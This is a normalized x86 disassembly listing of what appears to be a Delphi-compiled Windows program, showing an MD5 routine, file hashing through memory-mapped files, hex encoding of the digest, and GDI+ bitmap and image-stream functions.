mov [ fs : eax ] esp
push 0x0
call CoInitialize
lea edx [ ebp - 0x4 ]
mov eax rw-data
call sub_42be44
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx r-xdata
call sub_407050
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
sub_45eac4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx edx
xor eax eax
push ebp
push sub_45eb13
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CoInitialize
lea edx [ ebp - 0x4 ]
mov eax rw-data
call sub_42be44
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx r-xdata
call sub_407050
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
sub_45eb30
push esi
push edi
mov edi eax
mov esi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
mov edx [ rw-data ]
mov [ eax + 0x14 ] edx
pop edi
pop esi
retn
sub_45eb54
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebx eax
mov edi edx
mov ebp [ ebx + 0x10 ]
add [ ebx + 0x10 ] esi
cmp ebp [ ebx + 0x10 ]
jbe r-xdata
and ebp 0x3f
mov eax 0x40
sub eax ebp
mov ebp eax
cmp esi ebp
jae r-xdata
inc [ ebx + 0x14 ]
lea edx [ ebx + 0x18 ]
add edx 0x40
sub edx ebp
mov eax edi
mov ecx ebp
call sub_4030fc
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_45ec78
add edi ebp
sub esi ebp
cmp esi 0x40
jb r-xdata
lea edx [ ebx + 0x18 ]
add edx 0x40
sub edx ebp
mov eax edi
mov ecx esi
call sub_4030fc
jmp r-xdata
lea edx [ ebx + 0x18 ]
mov eax edi
mov ecx esi
call sub_4030fc
lea edx [ ebx + 0x18 ]
mov eax edi
mov ecx 0x40
call sub_4030fc
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_45ec78
add edi 0x40
sub esi 0x40
cmp esi 0x40
jae r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45ebe8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
and eax 0x3f
lea edx [ ebx + 0x18 ]
add edx eax
mov [ edx ] 0x80
inc edx
mov ecx 0x37
sub ecx eax
mov eax ecx
test eax eax
jge r-xdata
xor ecx ecx
xchg edx eax
call sub_403af4
mov eax [ ebx + 0x10 ]
add eax eax
add eax eax
add eax eax
mov [ ebx + 0x50 ] eax
mov eax [ ebx + 0x14 ]
add eax eax
add eax eax
add eax eax
mov edx [ ebx + 0x10 ]
shr edx 0x1d
or eax edx
mov [ ebx + 0x54 ] eax
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_45ec78
mov edx esi
mov eax ebx
mov ecx 0x10
call sub_4030fc
mov eax ebx
xor ecx ecx
mov edx 0x58
call sub_403af4
pop esi
pop ebx
retn
add eax 0x8
xor ecx ecx
xchg edx eax
call sub_403af4
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_45ec78
lea edx [ ebx + 0x18 ]
mov eax 0x38
sub_45ec78
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] eax
mov ecx [ esp ]
mov ecx [ ecx ]
mov ebx [ esp ]
mov ebx [ ebx + 0x4 ]
mov esi [ esp ]
mov esi [ esi + 0x8 ]
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edi [ edx ]
add edi [ rw-data ]
mov ebp eax
xor ebp esi
and ebp ebx
xor ebp eax
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x7
shr ecx 0x19
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x4 ]
add edi [ rw-data ]
mov ebp esi
xor ebp ebx
and ebp ecx
xor ebp esi
add edi ebp
add eax edi
mov edi eax
shl edi 0xc
shr eax 0x14
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x8 ]
add edi [ rw-data ]
mov ebp ebx
xor ebp ecx
and ebp eax
xor ebp ebx
add edi ebp
add esi edi
mov edi esi
shl edi 0x11
shr esi 0xf
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0xc ]
add edi [ rw-data ]
mov ebp ecx
xor ebp eax
and ebp esi
xor ebp ecx
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x16
shr ebx 0xa
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x10 ]
add edi [ rw-data ]
mov ebp eax
xor ebp esi
and ebp ebx
xor ebp eax
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x7
shr ecx 0x19
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x14 ]
add edi [ rw-data ]
mov ebp esi
xor ebp ebx
and ebp ecx
xor ebp esi
add edi ebp
add eax edi
mov edi eax
shl edi 0xc
shr eax 0x14
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x18 ]
add edi [ rw-data ]
mov ebp ebx
xor ebp ecx
and ebp eax
xor ebp ebx
add edi ebp
add esi edi
mov edi esi
shl edi 0x11
shr esi 0xf
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0x1c ]
add edi [ rw-data ]
mov ebp ecx
xor ebp eax
and ebp esi
xor ebp ecx
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x16
shr ebx 0xa
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x20 ]
add edi [ rw-data ]
mov ebp eax
xor ebp esi
and ebp ebx
xor ebp eax
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x7
shr ecx 0x19
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x24 ]
add edi [ rw-data ]
mov ebp esi
xor ebp ebx
and ebp ecx
xor ebp esi
add edi ebp
add eax edi
mov edi eax
shl edi 0xc
shr eax 0x14
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x28 ]
add edi [ rw-data ]
mov ebp ebx
xor ebp ecx
and ebp eax
xor ebp ebx
add edi ebp
add esi edi
mov edi esi
shl edi 0x11
shr esi 0xf
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0x2c ]
add edi [ rw-data ]
mov ebp ecx
xor ebp eax
and ebp esi
xor ebp ecx
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x16
shr ebx 0xa
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x30 ]
add edi [ rw-data ]
mov ebp eax
xor ebp esi
and ebp ebx
xor ebp eax
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x7
shr ecx 0x19
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x34 ]
add edi [ rw-data ]
mov ebp esi
xor ebp ebx
and ebp ecx
xor ebp esi
add edi ebp
add eax edi
mov edi eax
shl edi 0xc
shr eax 0x14
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x38 ]
add edi [ rw-data ]
mov ebp ebx
xor ebp ecx
and ebp eax
xor ebp ebx
add edi ebp
add esi edi
mov edi esi
shl edi 0x11
shr esi 0xf
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0x3c ]
add edi [ rw-data ]
mov ebp ecx
xor ebp eax
and ebp esi
xor ebp ecx
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x16
shr ebx 0xa
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x4 ]
add edi [ rw-data ]
mov ebp esi
xor ebp ebx
and ebp eax
xor ebp esi
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x5
shr ecx 0x1b
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x18 ]
add edi [ rw-data ]
mov ebp ebx
xor ebp ecx
and ebp esi
xor ebp ebx
add edi ebp
add eax edi
mov edi eax
shl edi 0x9
shr eax 0x17
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x2c ]
add edi [ rw-data ]
mov ebp ecx
xor ebp eax
and ebp ebx
xor ebp ecx
add edi ebp
add esi edi
mov edi esi
shl edi 0xe
shr esi 0x12
or edi esi
add edi eax
mov esi edi
mov edi [ edx ]
add edi [ rw-data ]
mov ebp eax
xor ebp esi
and ebp ecx
xor ebp eax
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x14
shr ebx 0xc
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x14 ]
add edi [ rw-data ]
mov ebp esi
xor ebp ebx
and ebp eax
xor ebp esi
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x5
shr ecx 0x1b
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x28 ]
add edi [ rw-data ]
mov ebp ebx
xor ebp ecx
and ebp esi
xor ebp ebx
add edi ebp
add eax edi
mov edi eax
shl edi 0x9
shr eax 0x17
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x3c ]
add edi [ rw-data ]
mov ebp ecx
xor ebp eax
and ebp ebx
xor ebp ecx
add edi ebp
add esi edi
mov edi esi
shl edi 0xe
shr esi 0x12
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0x10 ]
add edi [ rw-data ]
mov ebp eax
xor ebp esi
and ebp ecx
xor ebp eax
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x14
shr ebx 0xc
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x24 ]
add edi [ rw-data ]
mov ebp esi
xor ebp ebx
and ebp eax
xor ebp esi
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x5
shr ecx 0x1b
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x38 ]
add edi [ rw-data ]
mov ebp ebx
xor ebp ecx
and ebp esi
xor ebp ebx
add edi ebp
add eax edi
mov edi eax
shl edi 0x9
shr eax 0x17
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0xc ]
add edi [ rw-data ]
mov ebp ecx
xor ebp eax
and ebp ebx
xor ebp ecx
add edi ebp
add esi edi
mov edi esi
shl edi 0xe
shr esi 0x12
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0x20 ]
add edi [ rw-data ]
mov ebp eax
xor ebp esi
and ebp ecx
xor ebp eax
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x14
shr ebx 0xc
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x34 ]
add edi [ rw-data ]
mov ebp esi
xor ebp ebx
and ebp eax
xor ebp esi
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x5
shr ecx 0x1b
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x8 ]
add edi [ rw-data ]
mov ebp ebx
xor ebp ecx
and ebp esi
xor ebp ebx
add edi ebp
add eax edi
mov edi eax
shl edi 0x9
shr eax 0x17
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x1c ]
add edi [ rw-data ]
mov ebp ecx
xor ebp eax
and ebp ebx
xor ebp ecx
add edi ebp
add esi edi
mov edi esi
shl edi 0xe
shr esi 0x12
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0x30 ]
add edi [ rw-data ]
mov ebp eax
xor ebp esi
and ebp ecx
xor ebp eax
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x14
shr ebx 0xc
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x14 ]
add edi [ rw-data ]
mov ebp esi
xor ebp ebx
xor ebp eax
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x4
shr ecx 0x1c
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x20 ]
add edi [ rw-data ]
mov ebp ebx
xor ebp ecx
xor ebp esi
add edi ebp
add eax edi
mov edi eax
shl edi 0xb
shr eax 0x15
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x2c ]
add edi [ rw-data ]
mov ebp ecx
xor ebp eax
xor ebp ebx
add edi ebp
add esi edi
mov edi esi
shl edi 0x10
shr esi 0x10
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0x38 ]
add edi [ rw-data ]
mov ebp eax
xor ebp esi
xor ebp ecx
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x17
shr ebx 0x9
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x4 ]
add edi [ rw-data ]
mov ebp esi
xor ebp ebx
xor ebp eax
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x4
shr ecx 0x1c
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x10 ]
add edi [ rw-data ]
mov ebp ebx
xor ebp ecx
xor ebp esi
add edi ebp
add eax edi
mov edi eax
shl edi 0xb
shr eax 0x15
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x1c ]
add edi [ rw-data ]
mov ebp ecx
xor ebp eax
xor ebp ebx
add edi ebp
add esi edi
mov edi esi
shl edi 0x10
shr esi 0x10
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0x28 ]
add edi [ rw-data ]
mov ebp eax
xor ebp esi
xor ebp ecx
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x17
shr ebx 0x9
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x34 ]
add edi [ rw-data ]
mov ebp esi
xor ebp ebx
xor ebp eax
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x4
shr ecx 0x1c
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx ]
add edi [ rw-data ]
mov ebp ebx
xor ebp ecx
xor ebp esi
add edi ebp
add eax edi
mov edi eax
shl edi 0xb
shr eax 0x15
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0xc ]
add edi [ rw-data ]
mov ebp ecx
xor ebp eax
xor ebp ebx
add edi ebp
add esi edi
mov edi esi
shl edi 0x10
shr esi 0x10
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0x18 ]
add edi [ rw-data ]
mov ebp eax
xor ebp esi
xor ebp ecx
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x17
shr ebx 0x9
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x24 ]
add edi [ rw-data ]
mov ebp esi
xor ebp ebx
xor ebp eax
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x4
shr ecx 0x1c
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x30 ]
add edi [ rw-data ]
mov ebp ebx
xor ebp ecx
xor ebp esi
add edi ebp
add eax edi
mov edi eax
shl edi 0xb
shr eax 0x15
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x3c ]
add edi [ rw-data ]
mov ebp ecx
xor ebp eax
xor ebp ebx
add edi ebp
add esi edi
mov edi esi
shl edi 0x10
shr esi 0x10
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0x8 ]
add edi [ rw-data ]
mov ebp eax
xor ebp esi
xor ebp ecx
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x17
shr ebx 0x9
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx ]
add edi [ rw-data ]
mov ebp eax
not ebp
or ebp ebx
xor ebp esi
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x6
shr ecx 0x1a
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x1c ]
add edi [ rw-data ]
mov ebp esi
not ebp
or ebp ecx
xor ebp ebx
add edi ebp
add eax edi
mov edi eax
shl edi 0xa
shr eax 0x16
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x38 ]
add edi [ rw-data ]
mov ebp ebx
not ebp
or ebp eax
xor ebp ecx
add edi ebp
add esi edi
mov edi esi
shl edi 0xf
shr esi 0x11
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0x14 ]
add edi [ rw-data ]
mov ebp ecx
not ebp
or ebp esi
xor ebp eax
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x15
shr ebx 0xb
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x30 ]
add edi [ rw-data ]
mov ebp eax
not ebp
or ebp ebx
xor ebp esi
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x6
shr ecx 0x1a
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0xc ]
add edi [ rw-data ]
mov ebp esi
not ebp
or ebp ecx
xor ebp ebx
add edi ebp
add eax edi
mov edi eax
shl edi 0xa
shr eax 0x16
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x28 ]
add edi [ rw-data ]
mov ebp ebx
not ebp
or ebp eax
xor ebp ecx
add edi ebp
add esi edi
mov edi esi
shl edi 0xf
shr esi 0x11
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0x4 ]
add edi [ rw-data ]
mov ebp ecx
not ebp
or ebp esi
xor ebp eax
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x15
shr ebx 0xb
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x20 ]
add edi [ rw-data ]
mov ebp eax
not ebp
or ebp ebx
xor ebp esi
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x6
shr ecx 0x1a
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x3c ]
add edi [ rw-data ]
mov ebp esi
not ebp
or ebp ecx
xor ebp ebx
add edi ebp
add eax edi
mov edi eax
shl edi 0xa
shr eax 0x16
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x18 ]
add edi [ rw-data ]
mov ebp ebx
not ebp
or ebp eax
xor ebp ecx
add edi ebp
add esi edi
mov edi esi
shl edi 0xf
shr esi 0x11
or edi esi
add edi eax
mov esi edi
mov edi [ edx + 0x34 ]
add edi [ rw-data ]
mov ebp ecx
not ebp
or ebp esi
xor ebp eax
add edi ebp
add ebx edi
mov edi ebx
shl edi 0x15
shr ebx 0xb
or edi ebx
add edi esi
mov ebx edi
mov edi [ edx + 0x10 ]
add edi [ rw-data ]
mov ebp eax
not ebp
or ebp ebx
xor ebp esi
add edi ebp
add ecx edi
mov edi ecx
shl edi 0x6
shr ecx 0x1a
or edi ecx
add edi ebx
mov ecx edi
mov edi [ edx + 0x2c ]
add edi [ rw-data ]
mov ebp esi
not ebp
or ebp ecx
xor ebp ebx
add edi ebp
add eax edi
mov edi eax
shl edi 0xa
shr eax 0x16
or edi eax
add edi ecx
mov eax edi
mov edi [ edx + 0x8 ]
add edi [ rw-data ]
mov ebp ebx
not ebp
or ebp eax
xor ebp ecx
add edi ebp
add esi edi
mov edi esi
shl edi 0xf
shr esi 0x11
or edi esi
add edi eax
mov esi edi
mov edx [ edx + 0x24 ]
add edx [ rw-data ]
mov edi ecx
not edi
or edi esi
xor edi eax
add edx edi
add ebx edx
mov edx ebx
shl edx 0x15
shr ebx 0xb
or edx ebx
add edx esi
mov ebx edx
mov edx [ esp ]
add [ edx ] ecx
mov edx [ esp ]
add [ edx + 0x4 ] ebx
mov edx [ esp ]
add [ edx + 0x8 ] esi
mov edx [ esp ]
add [ edx + 0xc ] eax
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45f550
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov ebx esi
test ebx ebx
je r-xdata
mov eax esi
call sub_4059dc
mov ecx esp
mov edx ebx
call sub_45f5c0
mov eax esp
mov edx edi
call sub_45f740
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_45f588
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_40a26c
test al al
jne r-xdata
mov edx esp
mov eax ebx
call sub_45f5f8
mov eax esp
mov edx esi
call sub_45f740
mov eax esi
call sub_405530
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_45f5c0
push ebx
push esi
push edi
add esp 0xffffff98
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
call sub_45eb30
mov edx ebx
mov eax esp
mov ecx esi
call sub_45eb54
lea edx [ esp + 0x58 ]
mov eax esp
call sub_45ebe8
lea esi [ esp + 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x68
pop edi
pop esi
pop ebx
retn
sub_45f5f8
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_40a26c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x68 ]
call sub_45eb30
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x3
push 0x80000000
mov eax ebx
call sub_4059dc
push eax
call CreateFileA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x78 ]
lea eax [ ebp - 0x68 ]
call sub_45ebe8
mov eax [ ebp - 0x4 ]
lea esi [ ebp - 0x78 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
push ebp
push sub_45f718
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x2
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call CreateFileMappingA
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
xor eax eax
push ebp
push sub_45f6fa
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x4
mov eax [ ebp - 0xc ]
push eax
call MapViewOfFile
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
xor eax eax
push ebp
push sub_45f6dc
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetFileSize
mov ecx eax
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x68 ]
call sub_45eb54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call UnmapViewOfFile
retn
sub_45f740
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx 0x20
call sub_405c6c
mov eax [ ebx ]
call sub_4059dc
mov edx eax
mov ecx 0x10
mov eax esi
movzx ebx [ eax ]
shr ebx 0x4
movzx ebx [ ebx + rw-data ]
mov [ edx ] bl
movzx ebx [ eax ]
and bl 0xf
movzx ebx bl
movzx ebx [ ebx + rw-data ]
mov [ edx + 0x1 ] bl
add edx 0x2
inc eax
dec ecx
jne r-xdata
pop esi
pop ebx
retn
sub_45fa00
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
push eax
call GdipDisposeImage
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_45fa24
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_407080
xor eax eax
push ebp
push sub_45fa7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call GdipSaveImageToStream
mov edx eax
mov eax ebx
call sub_45fab0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fa81
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
sub_45fa8c
push ebx
push ecx
mov ebx eax
push esp
mov eax [ ebx + 0x4 ]
push eax
call GdipGetImagePixelFormat
mov edx eax
mov eax ebx
call sub_45fab0
mov eax [ esp ]
pop edx
pop ebx
retn
sub_45fabc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
push eax
push esi
call GdipCreateBitmapFromScan0
mov [ edi + 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_45faac
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_45fb1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
push esi
call GdipCreateBitmapFromHBITMAP
mov [ edi + 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_45faac
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_45fb74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_404974
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_45fc4c
mov eax edi
test bl bl
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call GdipGetImageGraphicsContext
mov [ edi + 0x8 ] eax
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_45fbd0
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
push eax
call GdipDeleteGraphics
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_45fbf4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call GdipSetInterpolationMode
mov edx eax
mov eax ebx
call sub_45fc50
pop esi
pop ebx
retn
sub_45fc10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
test edx edx
je r-xdata
xor esi esi
mov esi [ edx + 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GdipDrawImageRectI
mov edx eax
mov eax ebx
call sub_45fc50
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_45fc5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45fced
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fcf4
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_404650
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_404650
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_404650
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_404650
mov eax [ rw-data ]
push eax
call GdiplusShutdown
mov eax [ rw-data ]
call sub_404650
sub_45fcf8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_45fdc8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0xffffffff
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_45f9ec
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fdcf
lea eax [ ebp - 0x18 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebp - 0x14 ]
call sub_402f00
mov esi eax
test esi esi
je r-xdata
mov ecx esi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_45f9f4
mov edi [ ebp - 0x10 ]
dec edi
test edi edi
jb r-xdata
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_402f1c
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
imul eax ebx 0x13
mov edx [ ebp - 0x8 ]
push esi
push edi
lea esi [ esi + eax * 4 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov [ ebp - 0xc ] ebx
lea eax [ ebp - 0x18 ]
imul edx ebx 0x13
mov edx [ esi + edx * 4 + 0x30 ]
call sub_405758
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
call sub_405974
jne r-xdata
sub_45fddc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
